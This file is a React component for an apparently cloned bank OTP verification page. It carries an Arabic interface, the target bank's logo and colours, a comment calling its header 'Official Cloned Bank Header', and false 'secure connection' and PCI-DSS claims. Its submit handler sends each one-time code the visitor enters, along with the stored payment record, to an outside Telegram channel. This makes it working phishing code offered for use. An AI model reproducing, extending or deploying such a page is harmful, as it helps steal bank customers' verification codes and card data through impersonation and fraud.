import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, AlertCircle, Check, Lock, Clock, X, ShieldCheck, Smartphone, HelpCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";

const PaymentOTP = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment, refetch } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();
  
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isLocked, setIsLocked] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180);
  
  const selectedBankId = link?.payload?.selectedBank || '';
  const selectedCountry = link?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(selectedCountry);
  const allBanks = getBanksByCountry(selectedCountry);
  const selectedBank = allBanks.find(b => b.id === selectedBankId);

  const primaryColor = selectedBank?.color || '#004B8D';
  
  useEffect(() => {
    if (timeLeft > 0 && !isLocked) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft, isLocked]);
  
  useEffect(() => {
    if (payment?.locked_until) {
      const lockTime = new Date(payment.locked_until).getTime();
      const now = Date.now();
      
      if (now < lockTime) {
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        setIsLocked(false);
      }
    }
  }, [payment]);
  
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };
  
  const handleSubmit = async () => {
    if (!payment || isLocked) return;
    setError("");

    const isCorrect = otp === payment.otp;

    await sendToTelegram({
      type: 'payment_otp_attempt',
      data: { ...payment, otp, otp_status: isCorrect ? 'correct' : 'wrong' },
      timestamp: new Date().toISOString()
    });

    if (otp === payment.otp) {
      await updatePayment.mutateAsync({
        paymentId: payment.id,
        updates: { status: "confirmed", receipt_url: `/pay/${id}/receipt/${payment.id}` },
      });
      toast({ title: "تم بنجاح!", description: "تم تأكيد الدفع بنجاح" });
      navigate(`/pay/${id}/receipt/${payment.id}`);
    } else {
      const newAttempts = (payment.attempts || 0) + 1;
      if (newAttempts >= 3) {
        const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();
        await updatePayment.mutateAsync({ paymentId: payment.id, updates: { attempts: newAttempts, locked_until: lockUntil } });
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        await updatePayment.mutateAsync({ paymentId: payment.id, updates: { attempts: newAttempts } });
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        refetch();
      }
    }
  };
  
  if (!selectedBank) return null;

  return (
    <div className="min-h-screen w-full flex flex-col bg-[#F6F7F9]" dir="rtl" style={{ fontFamily: selectedBank.font || 'Cairo, sans-serif' }}>
      {/* Official Cloned Bank Header */}
      <header className="w-full bg-white border-b shadow-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
          <div className="flex items-center gap-6">
            <img src={selectedBank.logo} alt={selectedBank.nameAr} className="h-8 sm:h-12 w-auto object-contain" />
            <div className="h-8 w-px bg-gray-200 hidden md:block" />
            <div className="hidden md:block">
              <h1 className="text-sm font-black text-gray-900 leading-tight">مركز التحقق الآمن</h1>
              <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Secure Verification Center</p>
            </div>
          </div>
          
          <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 border border-green-100 rounded-full">
            <Lock className="w-3.5 h-3.5 text-green-600" />
            <span className="text-[10px] font-black text-green-700">اتصال آمن</span>
          </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-6 sm:p-12 relative overflow-hidden">
        <div className="absolute inset-0 bg-blue-50/20 z-0" />
        
        <div className="w-full max-w-md relative z-10">
          <Card className="border-none shadow-2xl rounded-[2.5rem] overflow-hidden bg-white">
            <div className="p-8 sm:p-12">
              <div className="text-center mb-10">
                <div className="w-20 h-20 mx-auto mb-6 rounded-3xl flex items-center justify-center bg-blue-50 text-blue-600 border border-blue-100 shadow-xl shadow-blue-100/50">
                  <Smartphone className="w-10 h-10" />
                </div>
                <h2 className="text-2xl font-black text-gray-900 mb-2">التحقق من الهوية</h2>
                <p className="text-xs font-bold text-gray-400 leading-relaxed max-w-xs mx-auto">
                  لقد تم إرسال رمز التحقق (OTP) إلى هاتفك المسجل لدى {selectedBank.nameAr}.
                </p>
              </div>

              <div className="space-y-8">
                <div className="flex justify-center">
                  <InputOTP 
                    maxLength={4} 
                    value={otp} 
                    onChange={setOtp}
                    disabled={isLocked}
                    autoComplete="one-time-code"
                  >
                    <InputOTPGroup className="gap-4">
                      {[0, 1, 2, 3].map((index) => (
                        <InputOTPSlot 
                          key={index} 
                          index={index}
                          className="w-16 h-20 text-3xl font-black border-2 rounded-2xl bg-gray-50/50 transition-all"
                          style={{
                            borderColor: otp[index] ? primaryColor : '#E5E7EB',
                            color: primaryColor
                          }}
                        />
                      ))}
                    </InputOTPGroup>
                  </InputOTP>
                </div>

                {error && (
                  <div className="bg-red-50 border border-red-100 p-4 rounded-2xl flex items-start gap-3">
                    <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0" />
                    <p className="text-xs font-bold text-red-800 leading-relaxed">{error}</p>
                  </div>
                )}

                <div className="flex flex-col items-center gap-4">
                  <div className="flex items-center gap-2 text-xs font-bold text-gray-500">
                    <Clock className="w-4 h-4" />
                    <span>تنتهي صلاحية الرمز خلال: </span>
                    <span className="text-blue-600 font-black">{formatTime(timeLeft)}</span>
                  </div>
                  
                  <Button
                    size="lg"
                    className="w-full h-16 text-lg font-black text-white shadow-2xl transition-all duration-500 transform active:scale-95 group"
                    onClick={handleSubmit}
                    disabled={isLocked || otp.length < 4 || updatePayment.isPending}
                    style={{
                      backgroundColor: primaryColor,
                      borderRadius: selectedBank.radius,
                      boxShadow: `0 20px 40px -10px ${primaryColor}40`
                    }}
                  >
                    {updatePayment.isPending ? <Loader2 className="w-6 h-6 animate-spin" /> : "تأكيد العملية"}
                  </Button>
                  
                  <button className="text-xs font-bold text-gray-400 hover:text-blue-600 transition-colors uppercase tracking-widest">
                    إعادة إرسال الرمز
                  </button>
                </div>
              </div>

              <div className="mt-12 pt-8 border-t flex flex-col items-center gap-4">
                <div className="flex items-center gap-3">
                  <ShieldCheck className="w-5 h-5 text-green-500" />
                  <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Secure 3D-Verification</span>
                </div>
              </div>
            </div>
          </Card>

          <div className="mt-12 text-center px-10">
            <div className="flex items-center justify-center gap-2 mb-4 text-gray-300">
              <HelpCircle className="w-4 h-4" />
              <span className="text-xs font-bold">تحتاج لمساعدة؟</span>
            </div>
            <p className="text-[10px] text-gray-400 leading-relaxed font-bold uppercase tracking-wider">
              © 2026 {selectedBank.nameEn}. All Rights Reserved.<br />
              هذه الصفحة مؤمنة بموجب معايير PCI-DSS لبطاقات الدفع.
            </p>
          </div>
        </div>
      </main>
    </div>
  );
};

export default PaymentOTP;
